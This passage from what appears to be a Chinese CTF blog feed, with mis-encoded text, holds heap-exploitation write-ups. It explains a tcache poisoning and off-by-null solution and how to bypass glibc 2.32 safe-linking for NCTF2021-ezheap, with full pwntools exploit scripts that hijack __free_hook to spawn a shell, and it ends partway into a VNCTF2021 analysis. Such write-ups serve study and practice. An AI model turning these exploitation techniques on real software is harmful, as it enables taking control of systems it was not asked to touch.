alt="image-20221007235245651"></p><p>æ¥ä¸‹æ¥å°±æœ‰è®²ç©¶äº†ï¼Œæˆ‘ä»¬å…ˆé‡Šæ”¾æ‰spy chunkè®©å…¶è¿›å…¥tcache binä¸­ï¼Œå¦‚ä¸‹</p><p><img src="/../img/image-20221007235259547.png" alt="image-20221007235259547"></p><p>ç„¶åæ‰§è¡Œaddå‡½æ•°ç”³è¯·å†…å­˜ï¼Œä¿è¯è®©unsorted binä¸­çš„fdæŒ‡é’ˆè½åœ¨tcacheé“¾çš„fdæŒ‡é’ˆä¸Šã€‚å¦‚ä¸‹</p><p><img src="/../img/image-20221007235311061.png" alt="image-20221007235311061"></p><p>æœ€åä¸€æ­¥å°†spy chunkè¿™ç‰‡ç”³è¯·å‡ºæ¥(ä¸èƒ½æ­£å¥½æ˜¯spy chunkåŸæœ¬çš„sizeï¼Œä¸ç„¶å°±ç›´æ¥ä»tcache biné‡Œæ‹¿äº†)ï¼Œæ¯”å¦‚æˆ‘å†™çš„è„šæœ¬é‡Œï¼Œspy chunkçš„å¤§å°æ˜¯0x90ï¼Œè¿™é‡Œæˆ‘å°±ç”³è¯·ä¸€ä¸ª0x30çš„chunkï¼Œå°±å¯ä»¥å¯¹è¿™ç‰‡å†…å­˜è¿›è¡Œæ“ä½œäº†ã€‚ç„¶åå»ç¼–è¾‘åˆšåˆšç”³è¯·0x30çš„chunkæ”¹main_arena+88ä¸ºfree_hookçš„åœ°å€ï¼Œè¿™é‡Œæ˜¯éœ€è¦çˆ†ç ´åŠä¸ªå­—èŠ‚çš„ã€‚(æœ¬åœ°è°ƒçš„æ—¶å€™ï¼Œå¯ä»¥å…³é—­ASLRå°±ä¸ç”¨å†çˆ†ç ´äº†)</p><p>è¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº†çˆ†ç ´äº†ï¼Œæœ€åå°±æ˜¯å°†çˆ†å‡ºæ¥çš„free_hookåœ°å€ç”³è¯·å‡ºæ¥ï¼Œå†™å…¥æœ€å¼€å§‹mmapæ˜ å°„å‡ºæ¥çš„é‚£ä¸ªåœ°å€å³å¯ã€‚æœ€ç»ˆæ‰§è¡Œfreeå‡½æ•°è·å–shellã€‚</p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0xC85</span></span><br><span class="line">d_e=<span class="number">0xC9D</span></span><br><span class="line">d_d=<span class="number">0xC91</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pointer Address &quot;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Mmap: &quot;</span>)</span><br><span class="line">    mmap_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;mmap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0xf8</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">0x40</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e) </span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#delete(8)</span></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#double free</span></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0xf8)</span></span><br><span class="line">    edit(<span class="number">8</span>,p64(mmap_addr))</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    edit(<span class="number">12</span>,shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">    <span class="comment">#ä¸Šè¿°åœ¨å®Œæˆå¾€mmap_addrå†™å…¥shellcode</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x9f0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)<span class="comment">#spy chunk</span></span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x590</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;\xe8\x18&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)</span><br><span class="line">    edit(<span class="number">6</span>,p64(mmap_addr))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25780)</span></span><br><span class="line">        log(<span class="string">&#x27;-----------------&gt;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25780&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007235333587.png" alt="image-20221007235333587"></p><p>æœ€è¿‘å¿«è€ƒè¯•äº†ï¼Œè¿™æ®µæ—¶é—´åŸºæœ¬æ²¡æœ‰å’‹åœ¨buuä¸Šåˆ·é¢˜äº†ï¼Œä¸å¤ä¹ çš„æ—¶å€™å»å‡ºäº†å‡ é“é¢˜ã€‚hhhï¼Œæœ¬ä»¥ä¸ºå†åšå †çš„æ—¶å€™è¦æ¯”è¾ƒåƒåŠ›æˆ–è€…çœ‹çœ‹wpå•¥çš„ï¼Œä¸è¿‡ä»Šå¤©éšä¾¿åœ¨buuä¸Šæ‰¾äº†ä¸€é“å †åšäº†ä¸€ä¸‹ï¼Œæ²¡ä¸€ä¼šå°±åšå‡ºæ¥äº†ï¼Œæ„Ÿè§‰è¿˜è¡Œçš„å“ˆå“ˆå“ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcache poisoning </tag>
            
            <tag> off_by_null </tag>
            
            <tag> tcache dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Safe-Linking æœºåˆ¶çš„ç»•è¿‡</title>
      <link href="/posts/501cca6.html"/>
      <url>/posts/501cca6.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è‡ªä»å¼•å…¥äº† <code>tcache</code> æœºåˆ¶åï¼Œä» <code>2.26</code> å¼€å§‹ <code>tcache poisoning</code> å°±æ˜¯ä¸€ç§ç®€ä¾¿çš„æ”»å‡»æ–¹å¼ï¼Œå› ä¸ºå®ƒä¸éœ€è¦åƒ <code>fastbin attack</code> åˆ©ç”¨é‚£æ ·å¯¹ <code>size</code> æ£€æŸ¥è¾ƒä¸ºä¸¥æ ¼ï¼Œåªèƒ½ç”³è¯·åˆ° <code>malloc</code> å’Œ <code>setcontext</code> ä¸Šæ–¹çš„åŒºåŸŸã€‚ç¯¡æ”¹äº† <code>tcache bin</code> ä¸­å †å—çš„ <code>next</code> æŒ‡é’ˆå°±ç›¸å½“äºå¯ä»¥ä»»æ„åœ°å€ç”³è¯·äº† </p><h3 id="safe-Linking"><a href="#safe-Linking" class="headerlink" title="safe-Linking"></a>safe-Linking</h3><p>åœ¨ <code>2.32</code> ä¹‹å‰ <code>tcache poisoning</code> å¯ä»¥è¯´æ˜¯æ— å¾€ä¸åˆ©ï¼Œä½†åˆ°äº† <code>glibc 2.32</code> åŠä»¥åï¼Œå¢åŠ äº† <code>safe-Linking</code> æœºåˆ¶ã€‚ <code>safe-Linking</code> å°±æ˜¯å¯¹ <code>next</code> æŒ‡é’ˆè¿›è¡Œäº†ä¸€äº›è¿ç®—</p><p>è§„åˆ™æ˜¯å°† <strong>å½“å‰ <code>free</code> åè¿›å…¥ <code>tcache bin</code> å †å—çš„ç”¨æˆ·åœ°å€</strong> å³ç§» <code>12</code> ä½çš„å€¼å’Œ <strong>å½“å‰ <code>free</code> åè¿›å…¥ <code>tcache bin</code> å †å—åŸæœ¬æ­£å¸¸çš„ <code>next</code> å€¼</strong> è¿›è¡Œ<strong>å¼‚æˆ–</strong> ï¼Œç„¶åå°†è¿™ä¸ªå€¼é‡æ–°å†™å› <code>next</code> çš„ä½ç½®</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#define PROTECT_PTR(pos, ptr) \</span><br><span class="line">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></pre></td></tr></table></figure><p>è§¦å‘è¿™ä¸ª <code>PROTECT_PTR</code> å®ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æ˜¯å½“å‰ <code>free</code> çš„å †å—æ˜¯ç¬¬ä¸€ä¸ªè¿›å…¥ <code>tcache bin</code> çš„ï¼ˆæ­¤å‰ <code>tcache bin</code> ä¸­æ²¡æœ‰å †å—ï¼‰ï¼Œè¿™ç§æƒ…å†µåŸæœ¬ <code>next</code> çš„å€¼å°±æ˜¯ <code>0</code> ï¼Œç¬¬äºŒç§æƒ…å†µåˆ™æ˜¯åŸæœ¬çš„ <code>next</code> å€¼å·²ç»æœ‰æ•°æ®äº†ã€‚<strong>å¦‚æœæ˜¯ç¬¬ä¸€ç§æƒ…å†µçš„è¯ï¼Œå¯¹äº <code>safe-Linking</code> æœºåˆ¶è€Œè¨€ï¼Œå¯èƒ½å¹¶æ²¡æœ‰èµ·åˆ°é¢„æœŸçš„ä½œç”¨ï¼Œå› ä¸ºå°†å½“å‰å †åœ°å€å³ç§» <code>12</code> ä½å’Œ <code>0</code> å¼‚æˆ–ï¼Œå…¶å®å€¼æ²¡æœ‰æ”¹å˜ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ³„éœ²å‡ºè¿™ä¸ªè¿ç®—åçš„ç»“æœï¼Œå†å°†å…¶å·¦ç§» <code>12</code> ä½å°±å¯ä»¥åæ¨å‡ºæ¥å †åœ°å€ï¼Œå¦‚æœæœ‰äº†å †åœ°å€ä¹‹åï¼Œé‚£æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç¯¡æ”¹ <code>next</code> æŒ‡é’ˆï¼Œè¾¾åˆ°ä»»æ„åœ°å€ç”³è¯·çš„æ•ˆæœ</strong> </p><p>æ¢å¤ <code>next</code> çš„å®ä¸º <code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code> ï¼Œå…¶å®è¿™ä¸ªå®æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨äº† <code>PROTECT_PTR</code> ï¼ŒåŸç†å°±æ˜¯ <code>A=B^C ; C=A^B</code> </p><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="NCTF2021-ezheap"><a href="#NCTF2021-ezheap" class="headerlink" title="NCTF2021-ezheap"></a>NCTF2021-ezheap</h4><p>[é¢˜ç›®é“¾æ¥](<a href="https://github.com/X1cT34m/NCTF2021/tree/main/Pwn/ezheap">NCTF2021&#x2F;Pwn&#x2F;ezheap at main Â· X1cT34m&#x2F;NCTF2021 (github.com)</a>)</p><p>æœ¬é¢˜çš„ <code>libc</code> ç‰ˆæœ¬ä¸º <code>2.32</code>ï¼Œå› ä¸ºæ˜¯æœ¬åœ°å¤ç°ï¼Œæ‰€ä»¥æˆ‘å°±éšä¾¿é€‰äº†ä¸€ä¸ª <code>2.32</code> çš„å°ç‰ˆæœ¬æ¥åšäº†</p><h5 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044578.png" alt="image-20230319104415444" style="zoom:67%;" /><h5 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044228.png" alt="image-20230319104447181" style="zoom:50%;" /><p>åœ¨ <code>delete</code> å‡½æ•°ä¸­ï¼Œå‘ç° <code>free</code> æ‰ <code>malloc_store[index]</code> åå°† <code>size_store[index]</code> ç»™ç½®ç©ºäº†ï¼Œç”±äºå¿˜è®°ç»™ <code>malloc_store[index]</code> é€ æˆäº† <code>UAF</code> ã€‚</p><p>å› ä¸ºæœ¬é¢˜æœ‰ <code>edit</code> å’Œ <code>show</code> å‡½æ•°ï¼Œæ‰€ä»¥ç¯¡æ”¹ <code>next</code> ä»¥åŠæ³„éœ²å †åœ°å€å’Œ <code>libc</code> åœ°å€éƒ½è¾ƒä¸ºè½»æ¾</p><h5 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h5><h6 id="edit-after-free"><a href="#edit-after-free" class="headerlink" title="edit-after-free"></a>edit-after-free</h6><p>è€ƒè™‘ä¸€ç‚¹å°±æ˜¯ <code>delete</code> å‡½æ•°åä¼šå°† <code>size[index]</code> ç½®ç©ºï¼Œå¦‚æœç›´æ¥ <code>edit</code> çš„è¯ï¼Œæ— æ³•å¾€é‡Œé¢å†™å…¥æ•°æ®ã€‚é‡‡å–çš„æªæ–½æ˜¯ å…ˆç”³è¯· <code>chunk1</code> ç„¶åå°†å…¶é‡Šæ”¾ï¼Œæ­¤æ—¶å®ƒçš„ <code>size</code> è¢«ç½®ç©ºäº†ï¼Œä½†æ˜¯åœ°å€ä¾ç„¶ç•™åœ¨äº† <code>malloc_store</code> é‡Œé¢ï¼Œæ­¤æ—¶å†ç”³è¯·ç­‰å¤§çš„ <code>chunk2</code>ï¼Œæ­¤æ—¶å†æ¬¡é‡Šæ”¾ <code>chunk1</code> ï¼ˆå› ä¸ºåˆšåˆšçš„ <code>chunk2</code> æ˜¯å°†åŸæœ¬çš„ <code>chunk1</code> ç”³è¯·å‡ºæ¥äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¼šé€ æˆ <code>double free</code>ï¼‰ï¼Œæ­¤æ—¶ <code>chunk1</code> å’Œ <code>chunk2</code> æŒ‡å‘çš„åœ°å€æ˜¯ç›¸åŒçš„ï¼Œ<code>chunk1</code> çš„ <code>size</code> ä¸º <code>0</code>ï¼Œ <code>chunk2</code> çš„ <code>size</code> æ­£å¸¸ï¼Œå¹¶ä¸”ç¼–è¾‘ <code>chunk2</code> å°±å¯ä»¥ç¯¡æ”¹å·²ç»å¤„äº <code>free</code> çŠ¶æ€çš„ <code>chunk1</code>ï¼Œä»è€Œä¿®æ”¹å…¶ <code>next</code> æŒ‡é’ˆã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p>é€šè¿‡ä¸‹å›¾å¯ä»¥å‘ç°ï¼Œæ­¤æ—¶ <code>0x000055d5f6e622a0</code> çš„ä½ç½®æ˜¯æœ‰ä¸¤ä¸ªï¼Œç¬¬äºŒä¸ªå¯¹åº”çš„ <code>size</code> æ˜¯ <code>0x70</code>ï¼Œæ‰€ä»¥å¯ä»¥åœ¨è¿™é‡Œç¯¡æ”¹ <code>next</code> æŒ‡é’ˆ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191104276.png" alt="image-20230319110417830" style="zoom: 67%;" /><h6 id="æ³„éœ²å †åœ°å€"><a href="#æ³„éœ²å †åœ°å€" class="headerlink" title="æ³„éœ²å †åœ°å€"></a>æ³„éœ²å †åœ°å€</h6><p>æ­¤æ—¶çš„ <code>tcache bin</code> ä¸­åªæœ‰ä¸€ä¸ªå †å—ï¼Œæ‰§è¡Œ <code>show</code> å‡½æ•°æ³„éœ²å…¶ <code>next</code> æŒ‡é’ˆæ•°æ®ï¼Œå¾—åˆ°äº† <code>0x551dcbb2</code> ï¼Œæˆ‘ä»¬å°†å…¶å·¦ç§» <code>12</code> ä½å³å¯å¾—åˆ°å †åœ°å€ï¼ˆå› ä¸º <code>next</code> åŸæœ¬ä¸º <code>0</code>ï¼Œå’Œ <code>0</code> å¼‚æˆ–ç»“æœä¸å˜ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191109678.png" alt="image-20230319110941492" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å³å¯å¾—åˆ°å †åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191113663.png" alt="image-20230319111330505" style="zoom:50%;" /><h6 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h6><p>æœ€åä¸€ç‚¹éœ€è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•å°† <code>__free_hook</code> å†™å…¥åˆ° <code>next</code> æŒ‡é’ˆä¸Šã€‚</p><p>å› ä¸º <code>safe_Linking</code> æœºåˆ¶ä¼šå­˜æ”¾ <code>next</code> æŒ‡é’ˆè¿ç®—åçš„ç»“æœï¼Œå› æ­¤ <code>tcache poisoning</code> åªéœ€è¦æˆ‘ä»¬è‡ªå·±å°† <code>__free_hook</code> åœ°å€è¿›è¡ŒåŒæ ·æ–¹æ³•è¿ç®—å†™å…¥ <code>next</code> ä½ç½®ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br></pre></td></tr></table></figure><p><code>heap_base+0x2a0</code> æ˜¯å½“å‰ <code>free</code> åè¿›å…¥ <code>tcache bin</code> å †å—çš„ç”¨æˆ·åœ°å€</p><p>æ­¤æ—¶ <code>__free_hook</code> å†™å…¥ <code>next</code> åçš„æƒ…å†µå¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191154909.png" alt="image-20230319115455792"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191155547.png" alt="image-20230319115549446"></p><p>æœ€åå°† <code>__free_hook</code> ç”³è¯·å‡ºæ¥å†™å…¥ <code>system</code> åœ°å€ï¼Œé€šè¿‡ <code>free</code> é‡Šæ”¾æ‰ä¸€ä¸ªå­˜æœ‰ <code>/bin/sh</code> å­—ç¬¦ä¸²çš„å †å—ï¼Œè·å– <code>shell</code>ã€‚</p><p><strong>æ³¨æ„ï¼š</strong> éœ€è¦æå‰å¸ƒå±€ <code>0x80</code> è¿™æ¡é“¾çš„å †å—ï¼Œä¿è¯å…¶ <code>counts</code> åœ¨ç”³è¯· <code>__free_hook</code> æ—¶è¦å¤§äº <code>0</code>ï¼Œå¦åˆ™æ— æ³•ä»è¿™æ¡ <code>tcache bin</code> ä¸­ç”³è¯·å‡ºæ¥ <code>__free_hook</code></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak heap_address</span></span><br><span class="line"></span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;preven chunk&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">11</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#goto unsorted bin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">10</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e3c00</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1769</span>,<span class="number">0x172A</span>,<span class="number">0x1754</span>,<span class="number">0x173F</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(value))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191159819.png" alt="image-20230319115958381" style="zoom: 50%;" /><h4 id="VNCTF2021-ff"><a href="#VNCTF2021-ff" class="headerlink" title="VNCTF2021-ff"></a>VNCTF2021-ff</h4><p>é¢˜ç›®é™„ä»¶åœ¨ BUUCTF ä¸­çš„ VNCTF2021 æ¯”èµ›ä¸­å¯ä»¥æ‰¾åˆ°</p><h5 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201401195.png" alt="image-20230320140126119"></p><h5 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p><code>libc</code> ä¸º <code>2.32-0ubuntu3_amd64</code> ï¼Œè¿™ä¸ªç‰ˆæœ¬å­˜åœ¨ <code>safe-Linking</code> æœºåˆ¶</p><p><code>add</code> å‡½æ•°ï¼Œå¯¹ <code>size</code> è¿›è¡Œäº†é™åˆ¶ï¼Œæœ€å¤§èƒ½ç”³è¯· <code>0x7f</code> ,å¹¶ä¸”ç”³è¯·å‡ºæ¥çš„å †å—ç´¢å¼•ä¼šè¢«èµ‹å€¼ä¸ºå…¨å±€å˜é‡ <code>idx</code> ï¼Œæœ€å¤šç”³è¯· <code>0x10</code> ä¸ªå †å—</p><p><code>delete</code> å‡½æ•°å­˜åœ¨ <code>UAF</code> æ¼æ´ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•é€‰æ‹©ç´¢å¼•é‡Šæ”¾æŒ‡å®šçš„å 